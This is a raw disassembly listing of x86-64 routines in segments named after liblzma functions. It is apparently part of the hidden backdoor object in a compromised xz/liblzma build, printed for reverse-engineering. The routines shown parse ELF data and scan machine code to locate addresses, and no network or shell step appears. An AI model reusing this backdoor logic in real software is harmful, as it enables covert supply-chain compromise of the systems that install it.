.text.lzma_next_filter_inia:0000000000002CDD                 cmp     edx, 5000000h
.text.lzma_next_filter_inia:0000000000002CE3                 jnz     short loc_2CEF
.text.lzma_next_filter_inia:0000000000002CE5                 add     rax, [rsp+88h+var_80]
.text.lzma_next_filter_inia:0000000000002CEA                 add     rax, [rsp+88h+var_78]
.text.lzma_next_filter_inia:0000000000002CEF
.text.lzma_next_filter_inia:0000000000002CEF loc_2CEF:                               ; CODE XREF: sub_2C50+93↑j
.text.lzma_next_filter_inia:0000000000002CEF                 cmp     rax, r14
.text.lzma_next_filter_inia:0000000000002CF2                 jb      short loc_2CF9
.text.lzma_next_filter_inia:0000000000002CF4                 cmp     rbx, rax
.text.lzma_next_filter_inia:0000000000002CF7                 jnb     short loc_2D05
.text.lzma_next_filter_inia:0000000000002CF9
.text.lzma_next_filter_inia:0000000000002CF9 loc_2CF9:                               ; CODE XREF: sub_2C50+6E↑j
.text.lzma_next_filter_inia:0000000000002CF9                                         ; sub_2C50+7C↑j ...
.text.lzma_next_filter_inia:0000000000002CF9                 add     r13, [rsp+88h+var_78]
.text.lzma_next_filter_inia:0000000000002CFE                 jmp     short loc_2C96
.text.lzma_next_filter_inia:0000000000002D00 ; ---------------------------------------------------------------------------
.text.lzma_next_filter_inia:0000000000002D00
.text.lzma_next_filter_inia:0000000000002D00 loc_2D00:                               ; CODE XREF: sub_2C50+63↑j
.text.lzma_next_filter_inia:0000000000002D00                 inc     r13
.text.lzma_next_filter_inia:0000000000002D03                 jmp     short loc_2C96
.text.lzma_next_filter_inia:0000000000002D05 ; ---------------------------------------------------------------------------
.text.lzma_next_filter_inia:0000000000002D05
.text.lzma_next_filter_inia:0000000000002D05 loc_2D05:                               ; CODE XREF: sub_2C50+34↑j
.text.lzma_next_filter_inia:0000000000002D05                                         ; sub_2C50+A7↑j
.text.lzma_next_filter_inia:0000000000002D05                 add     rsp, 60h
.text.lzma_next_filter_inia:0000000000002D09                 pop     rbx
.text.lzma_next_filter_inia:0000000000002D0A                 pop     r12
.text.lzma_next_filter_inia:0000000000002D0C                 pop     r13
.text.lzma_next_filter_inia:0000000000002D0E                 pop     r14
.text.lzma_next_filter_inia:0000000000002D10                 pop     r15
.text.lzma_next_filter_inia:0000000000002D12                 retn
.text.lzma_next_filter_inia:0000000000002D12 sub_2C50        endp
.text.lzma_next_filter_inia:0000000000002D12
.text.lzma_next_filter_inia:0000000000002D12 _text_lzma_next_filter_inia ends
.text.lzma_next_filter_inia:0000000000002D12
.text.auto_decoder_iniz:0000000000002D20 ; ===========================================================================
.text.auto_decoder_iniz:0000000000002D20
.text.auto_decoder_iniz:0000000000002D20 ; Segment type: Pure code
.text.auto_decoder_iniz:0000000000002D20 ; Segment permissions: Read/Execute
.text.auto_decoder_iniz:0000000000002D20 _text_auto_decoder_iniz segment para public 'CODE' use64
.text.auto_decoder_iniz:0000000000002D20                 assume cs:_text_auto_decoder_iniz
.text.auto_decoder_iniz:0000000000002D20                 ;org 2D20h
.text.auto_decoder_iniz:0000000000002D20                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.auto_decoder_iniz:0000000000002D20
.text.auto_decoder_iniz:0000000000002D20 ; =============== S U B R O U T I N E =======================================
.text.auto_decoder_iniz:0000000000002D20
.text.auto_decoder_iniz:0000000000002D20
.text.auto_decoder_iniz:0000000000002D20 ; __int64 *__fastcall sub_2D20(__int64, __int64)
.text.auto_decoder_iniz:0000000000002D20 sub_2D20        proc near               ; CODE XREF: parse_elf_init+36D↓p
.text.auto_decoder_iniz:0000000000002D20
.text.auto_decoder_iniz:0000000000002D20 var_B0          = qword ptr -0B0h
.text.auto_decoder_iniz:0000000000002D20 var_A8          = qword ptr -0A8h
.text.auto_decoder_iniz:0000000000002D20 var_A0          = qword ptr -0A0h
.text.auto_decoder_iniz:0000000000002D20 var_94          = dword ptr -94h
.text.auto_decoder_iniz:0000000000002D20 var_90          = qword ptr -90h
.text.auto_decoder_iniz:0000000000002D20 var_88          = qword ptr -88h
.text.auto_decoder_iniz:0000000000002D20 var_80          = qword ptr -80h
.text.auto_decoder_iniz:0000000000002D20 var_78          = qword ptr -78h
.text.auto_decoder_iniz:0000000000002D20 var_65          = byte ptr -65h
.text.auto_decoder_iniz:0000000000002D20 var_64          = dword ptr -64h
.text.auto_decoder_iniz:0000000000002D20 var_58          = dword ptr -58h
.text.auto_decoder_iniz:0000000000002D20 var_50          = qword ptr -50h
.text.auto_decoder_iniz:0000000000002D20 var_48          = qword ptr -48h
.text.auto_decoder_iniz:0000000000002D20
.text.auto_decoder_iniz:0000000000002D20                 push    r15
.text.auto_decoder_iniz:0000000000002D22                 mov     rdx, rsi
.text.auto_decoder_iniz:0000000000002D25                 mov     eax, 10h
.text.auto_decoder_iniz:0000000000002D2A                 push    r14
.text.auto_decoder_iniz:0000000000002D2C                 push    r13
.text.auto_decoder_iniz:0000000000002D2E                 mov     r13, rsi
.text.auto_decoder_iniz:0000000000002D31                 push    r12
.text.auto_decoder_iniz:0000000000002D33                 push    rbx
.text.auto_decoder_iniz:0000000000002D34                 sub     rsp, 90h
.text.auto_decoder_iniz:0000000000002D3B                 mov     [rsp+0B8h+var_B0], rdi
.text.auto_decoder_iniz:0000000000002D40
.text.auto_decoder_iniz:0000000000002D40 loc_2D40:                               ; CODE XREF: sub_2D20+2E↓j
.text.auto_decoder_iniz:0000000000002D40                 mov     [rdx], eax
.text.auto_decoder_iniz:0000000000002D42                 add     eax, 8
.text.auto_decoder_iniz:0000000000002D45                 add     rdx, 20h ; ' '
.text.auto_decoder_iniz:0000000000002D49                 cmp     eax, 0E8h
.text.auto_decoder_iniz:0000000000002D4E                 jnz     short loc_2D40
.text.auto_decoder_iniz:0000000000002D50                 xor     eax, eax
.text.auto_decoder_iniz:0000000000002D52                 lea     rdi, [rsp+0B8h+var_80]
.text.auto_decoder_iniz:0000000000002D57                 mov     ecx, 16h
.text.auto_decoder_iniz:0000000000002D5C                 xor     edx, edx
.text.auto_decoder_iniz:0000000000002D5E                 rep stosd
.text.auto_decoder_iniz:0000000000002D60                 mov     rdi, [rsp+0B8h+var_B0]
.text.auto_decoder_iniz:0000000000002D65                 lea     rsi, [rsp+0B8h+var_90]
.text.auto_decoder_iniz:0000000000002D6A                 mov     [rsp+0B8h+var_90], rdx
.text.auto_decoder_iniz:0000000000002D6F                 mov     [rsp+0B8h+var_88], rdx
.text.auto_decoder_iniz:0000000000002D74                 call    _Llzma_check_update_0 ; PIC mode
.text.auto_decoder_iniz:0000000000002D79                 mov     r14, rax
.text.auto_decoder_iniz:0000000000002D7C                 test    rax, rax
.text.auto_decoder_iniz:0000000000002D7F                 lea     rax, [rsp+0B8h+var_80]
.text.auto_decoder_iniz:0000000000002D84                 mov     [rsp+0B8h+var_A0], rax
.text.auto_decoder_iniz:0000000000002D89                 jz      loc_2FC6
.text.auto_decoder_iniz:0000000000002D8F                 mov     rbx, [rsp+0B8h+var_90]
.text.auto_decoder_iniz:0000000000002D94                 cmp     rbx, 10h
.text.auto_decoder_iniz:0000000000002D98                 jbe     loc_2FC6
.text.auto_decoder_iniz:0000000000002D9E                 lea     rax, [rsp+0B8h+var_94]
.text.auto_decoder_iniz:0000000000002DA3                 add     rbx, r14
.text.auto_decoder_iniz:0000000000002DA6                 xor     edx, edx
.text.auto_decoder_iniz:0000000000002DA8                 mov     [rsp+0B8h+var_A8], rax
.text.auto_decoder_iniz:0000000000002DAD
.text.auto_decoder_iniz:0000000000002DAD loc_2DAD:                               ; CODE XREF: sub_2D20+EA↓j
.text.auto_decoder_iniz:0000000000002DAD                 mov     rsi, [rsp+0B8h+var_A8]
.text.auto_decoder_iniz:0000000000002DB2                 mov     rdi, [rsp+0B8h+var_B0]
.text.auto_decoder_iniz:0000000000002DB7                 xor     eax, eax
.text.auto_decoder_iniz:0000000000002DB9                 mov     [rsp+0B8h+var_94], eax
.text.auto_decoder_iniz:0000000000002DBD                 call    _Llzip_decode_0 ; PIC mode
.text.auto_decoder_iniz:0000000000002DC2                 mov     r12, rax
.text.auto_decoder_iniz:0000000000002DC5                 test    rax, rax
.text.auto_decoder_iniz:0000000000002DC8                 jz      short loc_2E0C
.text.auto_decoder_iniz:0000000000002DCA                 xor     r15d, r15d
.text.auto_decoder_iniz:0000000000002DCD
.text.auto_decoder_iniz:0000000000002DCD loc_2DCD:                               ; CODE XREF: sub_2D20+E3↓j
.text.auto_decoder_iniz:0000000000002DCD                 cmp     qword ptr [r13+r15+18h], 0
.text.auto_decoder_iniz:0000000000002DD3                 jnz     short loc_2DF8
.text.auto_decoder_iniz:0000000000002DD5                 mov     eax, [rsp+0B8h+var_94]
.text.auto_decoder_iniz:0000000000002DD9                 cmp     [r13+r15+0], eax
.text.auto_decoder_iniz:0000000000002DDE                 jnz     short loc_2DF8
.text.auto_decoder_iniz:0000000000002DE0                 mov     rdx, r12
.text.auto_decoder_iniz:0000000000002DE3                 mov     rsi, rbx
.text.auto_decoder_iniz:0000000000002DE6                 mov     rdi, r14
.text.auto_decoder_iniz:0000000000002DE9                 call    _Lstream_encode_1 ; PIC mode
.text.auto_decoder_iniz:0000000000002DEE                 test    rax, rax
.text.auto_decoder_iniz:0000000000002DF1                 jz      short loc_2DF8
.text.auto_decoder_iniz:0000000000002DF3                 mov     [r13+r15+18h], rax
.text.auto_decoder_iniz:0000000000002DF8
.text.auto_decoder_iniz:0000000000002DF8 loc_2DF8:                               ; CODE XREF: sub_2D20+B3↑j
.text.auto_decoder_iniz:0000000000002DF8                                         ; sub_2D20+BE↑j ...
.text.auto_decoder_iniz:0000000000002DF8                 add     r15, 20h ; ' '
.text.auto_decoder_iniz:0000000000002DFC                 cmp     r15, 360h
.text.auto_decoder_iniz:0000000000002E03                 jnz     short loc_2DCD
.text.auto_decoder_iniz:0000000000002E05                 lea     rdx, [r12+1]
.text.auto_decoder_iniz:0000000000002E0A                 jmp     short loc_2DAD
.text.auto_decoder_iniz:0000000000002E0C ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002E0C
.text.auto_decoder_iniz:0000000000002E0C loc_2E0C:                               ; CODE XREF: sub_2D20+A8↑j
.text.auto_decoder_iniz:0000000000002E0C                 lea     r12, [r13+8]
.text.auto_decoder_iniz:0000000000002E10                 lea     r15, [r13+368h]
.text.auto_decoder_iniz:0000000000002E17                 mov     rax, r12
.text.auto_decoder_iniz:0000000000002E1A
.text.auto_decoder_iniz:0000000000002E1A loc_2E1A:                               ; CODE XREF: sub_2D20+12F↓j
.text.auto_decoder_iniz:0000000000002E1A                 mov     rdx, [rax+10h]
.text.auto_decoder_iniz:0000000000002E1E                 test    rdx, rdx
.text.auto_decoder_iniz:0000000000002E21                 jz      short loc_2E48
.text.auto_decoder_iniz:0000000000002E23                 cmp     rdx, r14
.text.auto_decoder_iniz:0000000000002E26                 jnb     short loc_2E3B
.text.auto_decoder_iniz:0000000000002E28
.text.auto_decoder_iniz:0000000000002E28 loc_2E28:                               ; CODE XREF: sub_2D20+126↓j
.text.auto_decoder_iniz:0000000000002E28                 mov     rcx, [rax+8]
.text.auto_decoder_iniz:0000000000002E2C                 lea     rdx, [rcx-1]
.text.auto_decoder_iniz:0000000000002E30                 cmp     rdx, r14
.text.auto_decoder_iniz:0000000000002E33                 jb      short loc_2E48
.text.auto_decoder_iniz:0000000000002E35                 mov     [rax+8], r14
.text.auto_decoder_iniz:0000000000002E39                 jmp     short loc_2E48
.text.auto_decoder_iniz:0000000000002E3B ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002E3B
.text.auto_decoder_iniz:0000000000002E3B loc_2E3B:                               ; CODE XREF: sub_2D20+106↑j
.text.auto_decoder_iniz:0000000000002E3B                 cmp     [rax], r14
.text.auto_decoder_iniz:0000000000002E3E                 jnb     short loc_2E43
.text.auto_decoder_iniz:0000000000002E40                 mov     [rax], r14
.text.auto_decoder_iniz:0000000000002E43
.text.auto_decoder_iniz:0000000000002E43 loc_2E43:                               ; CODE XREF: sub_2D20+11E↑j
.text.auto_decoder_iniz:0000000000002E43                 cmp     r14, rdx
.text.auto_decoder_iniz:0000000000002E46                 jz      short loc_2E28
.text.auto_decoder_iniz:0000000000002E48
.text.auto_decoder_iniz:0000000000002E48 loc_2E48:                               ; CODE XREF: sub_2D20+101↑j
.text.auto_decoder_iniz:0000000000002E48                                         ; sub_2D20+113↑j ...
.text.auto_decoder_iniz:0000000000002E48                 add     rax, 20h ; ' '
.text.auto_decoder_iniz:0000000000002E4C                 cmp     rax, r15
.text.auto_decoder_iniz:0000000000002E4F                 jnz     short loc_2E1A
.text.auto_decoder_iniz:0000000000002E51                 mov     r13, r14
.text.auto_decoder_iniz:0000000000002E54
.text.auto_decoder_iniz:0000000000002E54 loc_2E54:                               ; CODE XREF: sub_2D20+152↓j
.text.auto_decoder_iniz:0000000000002E54                                         ; sub_2D20+176↓j ...
.text.auto_decoder_iniz:0000000000002E54                 cmp     r13, rbx
.text.auto_decoder_iniz:0000000000002E57                 jnb     loc_2F2F
.text.auto_decoder_iniz:0000000000002E5D                 mov     rdi, [rsp+0B8h+var_A0]
.text.auto_decoder_iniz:0000000000002E62                 mov     rsi, r13
.text.auto_decoder_iniz:0000000000002E65                 mov     rdx, rbx
.text.auto_decoder_iniz:0000000000002E68                 inc     r13
.text.auto_decoder_iniz:0000000000002E6B                 call    code_dasm       ; PIC mode
.text.auto_decoder_iniz:0000000000002E70                 test    eax, eax
.text.auto_decoder_iniz:0000000000002E72                 jz      short loc_2E54
.text.auto_decoder_iniz:0000000000002E74                 mov     rax, [rsp+0B8h+var_80]
.text.auto_decoder_iniz:0000000000002E79                 mov     rsi, [rsp+0B8h+var_78]
.text.auto_decoder_iniz:0000000000002E7E                 mov     edx, [rsp+0B8h+var_58]
.text.auto_decoder_iniz:0000000000002E82                 lea     r13, [rax+rsi]
.text.auto_decoder_iniz:0000000000002E86                 cmp     edx, 168h
.text.auto_decoder_iniz:0000000000002E8C                 jnz     short loc_2EA0
.text.auto_decoder_iniz:0000000000002E8E                 mov     rdx, [rsp+0B8h+var_48]
.text.auto_decoder_iniz:0000000000002E93                 test    rdx, rdx
.text.auto_decoder_iniz:0000000000002E96                 jz      short loc_2E54
.text.auto_decoder_iniz:0000000000002E98                 add     rdx, rsi
.text.auto_decoder_iniz:0000000000002E9B                 add     rax, rdx
.text.auto_decoder_iniz:0000000000002E9E                 jmp     short loc_2ED5
.text.auto_decoder_iniz:0000000000002EA0 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002EA0
.text.auto_decoder_iniz:0000000000002EA0 loc_2EA0:                               ; CODE XREF: sub_2D20+16C↑j
.text.auto_decoder_iniz:0000000000002EA0                 cmp     edx, 0A5FEh
.text.auto_decoder_iniz:0000000000002EA6                 jz      short loc_2ED5
.text.auto_decoder_iniz:0000000000002EA8                 cmp     edx, 10Dh
.text.auto_decoder_iniz:0000000000002EAE                 jnz     short loc_2E54
.text.auto_decoder_iniz:0000000000002EB0                 mov     al, [rsp+0B8h+var_65]
.text.auto_decoder_iniz:0000000000002EB4                 and     eax, 48h
.text.auto_decoder_iniz:0000000000002EB7                 cmp     al, 48h ; 'H'
.text.auto_decoder_iniz:0000000000002EB9                 jnz     short loc_2E54
.text.auto_decoder_iniz:0000000000002EBB                 mov     eax, [rsp+0B8h+var_64]
.text.auto_decoder_iniz:0000000000002EBF                 and     eax, 0FF00FF00h
.text.auto_decoder_iniz:0000000000002EC4                 cmp     eax, 5000000h
.text.auto_decoder_iniz:0000000000002EC9                 jnz     short loc_2E54
.text.auto_decoder_iniz:0000000000002ECB                 mov     rax, [rsp+0B8h+var_50]
.text.auto_decoder_iniz:0000000000002ED0                 add     rax, r13
.text.auto_decoder_iniz:0000000000002ED3                 jmp     short loc_2EDE
.text.auto_decoder_iniz:0000000000002ED5 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002ED5
.text.auto_decoder_iniz:0000000000002ED5 loc_2ED5:                               ; CODE XREF: sub_2D20+17E↑j
.text.auto_decoder_iniz:0000000000002ED5                                         ; sub_2D20+186↑j
.text.auto_decoder_iniz:0000000000002ED5                 test    rax, rax
.text.auto_decoder_iniz:0000000000002ED8                 jz      loc_2E54
.text.auto_decoder_iniz:0000000000002EDE
.text.auto_decoder_iniz:0000000000002EDE loc_2EDE:                               ; CODE XREF: sub_2D20+1B3↑j
.text.auto_decoder_iniz:0000000000002EDE                 cmp     r14, rax
.text.auto_decoder_iniz:0000000000002EE1                 ja      loc_2E54
.text.auto_decoder_iniz:0000000000002EE7                 cmp     rbx, rax
.text.auto_decoder_iniz:0000000000002EEA                 jb      loc_2E54
.text.auto_decoder_iniz:0000000000002EF0                 mov     rdx, r12
.text.auto_decoder_iniz:0000000000002EF3
.text.auto_decoder_iniz:0000000000002EF3 loc_2EF3:                               ; CODE XREF: sub_2D20+208↓j
.text.auto_decoder_iniz:0000000000002EF3                 mov     rsi, [rdx+10h]
.text.auto_decoder_iniz:0000000000002EF7                 test    rsi, rsi
.text.auto_decoder_iniz:0000000000002EFA                 jz      short loc_2F21
.text.auto_decoder_iniz:0000000000002EFC                 cmp     rsi, rax
.text.auto_decoder_iniz:0000000000002EFF                 jnb     short loc_2F14
.text.auto_decoder_iniz:0000000000002F01
.text.auto_decoder_iniz:0000000000002F01 loc_2F01:                               ; CODE XREF: sub_2D20+1FF↓j
.text.auto_decoder_iniz:0000000000002F01                 mov     rdi, [rdx+8]
.text.auto_decoder_iniz:0000000000002F05                 lea     rsi, [rdi-1]
.text.auto_decoder_iniz:0000000000002F09                 cmp     rsi, rax
.text.auto_decoder_iniz:0000000000002F0C                 jb      short loc_2F21
.text.auto_decoder_iniz:0000000000002F0E                 mov     [rdx+8], rax
.text.auto_decoder_iniz:0000000000002F12                 jmp     short loc_2F21
.text.auto_decoder_iniz:0000000000002F14 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002F14
.text.auto_decoder_iniz:0000000000002F14 loc_2F14:                               ; CODE XREF: sub_2D20+1DF↑j
.text.auto_decoder_iniz:0000000000002F14                 cmp     [rdx], rax
.text.auto_decoder_iniz:0000000000002F17                 jnb     short loc_2F1C
.text.auto_decoder_iniz:0000000000002F19                 mov     [rdx], rax
.text.auto_decoder_iniz:0000000000002F1C
.text.auto_decoder_iniz:0000000000002F1C loc_2F1C:                               ; CODE XREF: sub_2D20+1F7↑j
.text.auto_decoder_iniz:0000000000002F1C                 cmp     rsi, rax
.text.auto_decoder_iniz:0000000000002F1F                 jz      short loc_2F01
.text.auto_decoder_iniz:0000000000002F21
.text.auto_decoder_iniz:0000000000002F21 loc_2F21:                               ; CODE XREF: sub_2D20+1DA↑j
.text.auto_decoder_iniz:0000000000002F21                                         ; sub_2D20+1EC↑j ...
.text.auto_decoder_iniz:0000000000002F21                 add     rdx, 20h ; ' '
.text.auto_decoder_iniz:0000000000002F25                 cmp     rdx, r15
.text.auto_decoder_iniz:0000000000002F28                 jnz     short loc_2EF3
.text.auto_decoder_iniz:0000000000002F2A                 jmp     loc_2E54
.text.auto_decoder_iniz:0000000000002F2F ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002F2F
.text.auto_decoder_iniz:0000000000002F2F loc_2F2F:                               ; CODE XREF: sub_2D20+137↑j
.text.auto_decoder_iniz:0000000000002F2F                 lea     r13, [rsp+0B8h+var_88]
.text.auto_decoder_iniz:0000000000002F34
.text.auto_decoder_iniz:0000000000002F34 loc_2F34:                               ; CODE XREF: sub_2D20+267↓j
.text.auto_decoder_iniz:0000000000002F34                 mov     rdi, [rsp+0B8h+var_B0]
.text.auto_decoder_iniz:0000000000002F39                 xor     esi, esi
.text.auto_decoder_iniz:0000000000002F3B                 mov     r8, r13
.text.auto_decoder_iniz:0000000000002F3E                 mov     rcx, rbx
.text.auto_decoder_iniz:0000000000002F41                 mov     rdx, r14
.text.auto_decoder_iniz:0000000000002F44                 call    _Lstream_encoder_update_0 ; PIC mode
.text.auto_decoder_iniz:0000000000002F49                 test    rax, rax
.text.auto_decoder_iniz:0000000000002F4C                 jz      short loc_2FA6
.text.auto_decoder_iniz:0000000000002F4E                 mov     rdx, r12
.text.auto_decoder_iniz:0000000000002F51
.text.auto_decoder_iniz:0000000000002F51 loc_2F51:                               ; CODE XREF: sub_2D20+265↓j
.text.auto_decoder_iniz:0000000000002F51                 mov     rcx, [rdx+10h]
.text.auto_decoder_iniz:0000000000002F55                 test    rcx, rcx
.text.auto_decoder_iniz:0000000000002F58                 jz      short loc_2F7E
.text.auto_decoder_iniz:0000000000002F5A                 cmp     rcx, rax
.text.auto_decoder_iniz:0000000000002F5D                 jnb     short loc_2F71
.text.auto_decoder_iniz:0000000000002F5F
.text.auto_decoder_iniz:0000000000002F5F loc_2F5F:                               ; CODE XREF: sub_2D20+25C↓j
.text.auto_decoder_iniz:0000000000002F5F                 mov     rcx, [rdx+8]
.text.auto_decoder_iniz:0000000000002F63                 dec     rcx
.text.auto_decoder_iniz:0000000000002F66                 cmp     rcx, rax
.text.auto_decoder_iniz:0000000000002F69                 jb      short loc_2F7E
.text.auto_decoder_iniz:0000000000002F6B                 mov     [rdx+8], rax
.text.auto_decoder_iniz:0000000000002F6F                 jmp     short loc_2F7E
.text.auto_decoder_iniz:0000000000002F71 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002F71
.text.auto_decoder_iniz:0000000000002F71 loc_2F71:                               ; CODE XREF: sub_2D20+23D↑j
.text.auto_decoder_iniz:0000000000002F71                 cmp     [rdx], rax
.text.auto_decoder_iniz:0000000000002F74                 jnb     short loc_2F79
.text.auto_decoder_iniz:0000000000002F76                 mov     [rdx], rax
.text.auto_decoder_iniz:0000000000002F79
.text.auto_decoder_iniz:0000000000002F79 loc_2F79:                               ; CODE XREF: sub_2D20+254↑j
.text.auto_decoder_iniz:0000000000002F79                 cmp     rax, rcx
.text.auto_decoder_iniz:0000000000002F7C                 jz      short loc_2F5F
.text.auto_decoder_iniz:0000000000002F7E
.text.auto_decoder_iniz:0000000000002F7E loc_2F7E:                               ; CODE XREF: sub_2D20+238↑j
.text.auto_decoder_iniz:0000000000002F7E                                         ; sub_2D20+249↑j ...
.text.auto_decoder_iniz:0000000000002F7E                 add     rdx, 20h ; ' '
.text.auto_decoder_iniz:0000000000002F82                 cmp     rdx, r15
.text.auto_decoder_iniz:0000000000002F85                 jnz     short loc_2F51
.text.auto_decoder_iniz:0000000000002F87                 jmp     short loc_2F34
.text.auto_decoder_iniz:0000000000002F89 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002F89
.text.auto_decoder_iniz:0000000000002F89 loc_2F89:                               ; CODE XREF: sub_2D20+290↓j
.text.auto_decoder_iniz:0000000000002F89                 cmp     rax, rbx
.text.auto_decoder_iniz:0000000000002F8C                 jb      short loc_2FB2
.text.auto_decoder_iniz:0000000000002F8E                 cmp     [r12], rbx
.text.auto_decoder_iniz:0000000000002F92                 jnb     short loc_2F98
.text.auto_decoder_iniz:0000000000002F94                 mov     [r12], rbx
.text.auto_decoder_iniz:0000000000002F98
.text.auto_decoder_iniz:0000000000002F98 loc_2F98:                               ; CODE XREF: sub_2D20+272↑j
.text.auto_decoder_iniz:0000000000002F98                 cmp     rax, rbx
.text.auto_decoder_iniz:0000000000002F9B                 jz      short loc_2FB2
.text.auto_decoder_iniz:0000000000002F9D
.text.auto_decoder_iniz:0000000000002F9D loc_2F9D:                               ; CODE XREF: sub_2D20+28E↓j
.text.auto_decoder_iniz:0000000000002F9D                                         ; sub_2D20+29D↓j ...
.text.auto_decoder_iniz:0000000000002F9D                 add     r12, 20h ; ' '
.text.auto_decoder_iniz:0000000000002FA1                 cmp     r12, r15
.text.auto_decoder_iniz:0000000000002FA4                 jz      short loc_2FC6
.text.auto_decoder_iniz:0000000000002FA6
.text.auto_decoder_iniz:0000000000002FA6 loc_2FA6:                               ; CODE XREF: sub_2D20+22C↑j
.text.auto_decoder_iniz:0000000000002FA6                 mov     rax, [r12+10h]
.text.auto_decoder_iniz:0000000000002FAB                 test    rax, rax
.text.auto_decoder_iniz:0000000000002FAE                 jz      short loc_2F9D
.text.auto_decoder_iniz:0000000000002FB0                 jmp     short loc_2F89
.text.auto_decoder_iniz:0000000000002FB2 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002FB2
.text.auto_decoder_iniz:0000000000002FB2 loc_2FB2:                               ; CODE XREF: sub_2D20+26C↑j
.text.auto_decoder_iniz:0000000000002FB2                                         ; sub_2D20+27B↑j
.text.auto_decoder_iniz:0000000000002FB2                 mov     rax, [r12+8]
.text.auto_decoder_iniz:0000000000002FB7                 dec     rax
.text.auto_decoder_iniz:0000000000002FBA                 cmp     rax, rbx
.text.auto_decoder_iniz:0000000000002FBD                 jb      short loc_2F9D
.text.auto_decoder_iniz:0000000000002FBF                 mov     [r12+8], rbx
.text.auto_decoder_iniz:0000000000002FC4                 jmp     short loc_2F9D
.text.auto_decoder_iniz:0000000000002FC6 ; ---------------------------------------------------------------------------
.text.auto_decoder_iniz:0000000000002FC6
.text.auto_decoder_iniz:0000000000002FC6 loc_2FC6:                               ; CODE XREF: sub_2D20+69↑j
.text.auto_decoder_iniz:0000000000002FC6                                         ; sub_2D20+78↑j ...
.text.auto_decoder_iniz:0000000000002FC6                 add     rsp, 90h
.text.auto_decoder_iniz:0000000000002FCD                 pop     rbx
.text.auto_decoder_iniz:0000000000002FCE                 pop     r12
.text.auto_decoder_iniz:0000000000002FD0                 pop     r13
.text.auto_decoder_iniz:0000000000002FD2                 pop     r14
.text.auto_decoder_iniz:0000000000002FD4                 pop     r15
.text.auto_decoder_iniz:0000000000002FD6                 retn
.text.auto_decoder_iniz:0000000000002FD6 sub_2D20        endp
.text.auto_decoder_iniz:0000000000002FD6
.text.auto_decoder_iniz:0000000000002FD6 _text_auto_decoder_iniz ends
.text.auto_decoder_iniz:0000000000002FD6
.text.lzma_lzma_set_out_limia:0000000000002FE0 ; ===========================================================================
.text.lzma_lzma_set_out_limia:0000000000002FE0
.text.lzma_lzma_set_out_limia:0000000000002FE0 ; Segment type: Pure code
.text.lzma_lzma_set_out_limia:0000000000002FE0 ; Segment permissions: Read/Execute
.text.lzma_lzma_set_out_limia:0000000000002FE0 _text_lzma_lzma_set_out_limia segment para public 'CODE' use64
.text.lzma_lzma_set_out_limia:0000000000002FE0                 assume cs:_text_lzma_lzma_set_out_limia
.text.lzma_lzma_set_out_limia:0000000000002FE0                 ;org 2FE0h
.text.lzma_lzma_set_out_limia:0000000000002FE0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lzma_set_out_limia:0000000000002FE0
.text.lzma_lzma_set_out_limia:0000000000002FE0 ; =============== S U B R O U T I N E =======================================
.text.lzma_lzma_set_out_limia:0000000000002FE0
.text.lzma_lzma_set_out_limia:0000000000002FE0
.text.lzma_lzma_set_out_limia:0000000000002FE0 ; __int64 __fastcall sub_2FE0(unsigned __int64, unsigned __int64, unsigned __int64, unsigned __int64, unsigned __int64 *, __int64)
.text.lzma_lzma_set_out_limia:0000000000002FE0 sub_2FE0        proc near               ; CODE XREF: _Llzma_mf_bt4_find_0+10F↓p
.text.lzma_lzma_set_out_limia:0000000000002FE0
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_C0          = qword ptr -0C0h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_B8          = qword ptr -0B8h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_B0          = qword ptr -0B0h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_A8          = qword ptr -0A8h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_A0          = qword ptr -0A0h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_98          = qword ptr -98h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_8A          = byte ptr -8Ah
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_89          = byte ptr -89h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_80          = qword ptr -80h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_78          = qword ptr -78h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_70          = dword ptr -70h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_65          = byte ptr -65h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_64          = dword ptr -64h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_60          = byte ptr -60h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_58          = dword ptr -58h
.text.lzma_lzma_set_out_limia:0000000000002FE0 var_50          = qword ptr -50h
.text.lzma_lzma_set_out_limia:0000000000002FE0
.text.lzma_lzma_set_out_limia:0000000000002FE0                 push    r15
.text.lzma_lzma_set_out_limia:0000000000002FE2                 xor     eax, eax
.text.lzma_lzma_set_out_limia:0000000000002FE4                 push    r14
.text.lzma_lzma_set_out_limia:0000000000002FE6                 push    r13
.text.lzma_lzma_set_out_limia:0000000000002FE8                 push    r12
.text.lzma_lzma_set_out_limia:0000000000002FEA                 push    rbx
.text.lzma_lzma_set_out_limia:0000000000002FEB                 sub     rsp, 0A0h
.text.lzma_lzma_set_out_limia:0000000000002FF2                 mov     [r8], rax
.text.lzma_lzma_set_out_limia:0000000000002FF5                 mov     [rsp+0C8h+var_C0], rsi
.text.lzma_lzma_set_out_limia:0000000000002FFA                 mov     [rsp+0C8h+var_B0], rdx
.text.lzma_lzma_set_out_limia:0000000000002FFF                 mov     [rsp+0C8h+var_A8], rcx
.text.lzma_lzma_set_out_limia:0000000000003004                 cmp     rdi, rsi
.text.lzma_lzma_set_out_limia:0000000000003007                 jnb     loc_3295
.text.lzma_lzma_set_out_limia:000000000000300D                 xor     eax, eax
